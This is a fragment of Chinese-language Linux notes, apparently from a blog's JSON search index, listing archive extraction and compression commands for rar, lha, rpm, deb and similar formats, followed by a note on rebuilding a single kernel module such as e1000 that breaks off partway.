DirName———————————————.rar解压：rar x FileName.rar压缩：rar a FileName.rar DirName———————————————.lha解压：lha -e FileName.lha压缩：lha -a FileName.lha FileName———————————————.rpm解包：rpm2cpio FileName.rpm | cpio -div———————————————.deb解包：ar p FileName.deb data.tar.gz | tar zxf -———————————————.tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar .cpt .pit .sit .sea解压：sEx x FileName.*压缩：sEx a FileName.* FileName 单独重新编译一个内核模块当我们想修改内核某个模块,又不想重新make all的时候,可以这样操作. 1make drivers&#x2F;net&#x2F;ethernet&#x2F;intel&#x2F;e1000&#x2F;e1000.ko 或者 1make drivers&#x2F;net&#x2F;ethernet&#x2F;intel&#x2F;e1000&#x2F;","categories":[],"tags":[]}],"categories":[],"tags":[]}